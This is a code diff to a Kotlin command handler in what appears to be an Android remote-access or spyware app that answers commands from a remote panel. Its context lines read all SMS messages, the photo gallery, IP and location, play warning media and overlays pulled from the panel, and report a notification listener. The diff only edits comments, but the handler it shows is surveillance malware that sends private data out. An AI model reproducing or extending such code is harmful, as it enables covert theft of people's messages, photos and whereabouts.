@@ -129,7 +129,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ============ SEND VIDEO ============
+            // ============ SEND VIDEO (play warning.mp4) ============
             "send_mp4" -> {
                 val url = "${panelBase()}/videos/warning.mp4"
                 try {
@@ -146,7 +146,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true, "url" to url))
             }
 
-            // ============ SEND AUDIO ============
+            // ============ SEND AUDIO (play warning.mp3) ============
             "send_mp3" -> {
                 val url = "${panelBase()}/audios/warning.mp3"
                 try {
@@ -236,13 +236,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ============ SMS ============
+            // ============ SMS (inbox + sent + draft) ============
             "sms" -> done(readAllSms())
 
             // ============ GALLERY ============
             "gallery" -> done(readGallery())
 
-            // ============ IP ============
+            // ============ IP + LOCATION ============
             "ip" -> done(getIpInfo())
 
             // ============ FLASH ============
@@ -316,11 +316,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
+            // ============ HIDE BROADCAST ============
             "hide_broadcast" -> {
                 Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                 done(mapOf("ok" to true))
             }
 
+            // ============ READ NOTIFS ============
             "read_notifs" -> {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
             }
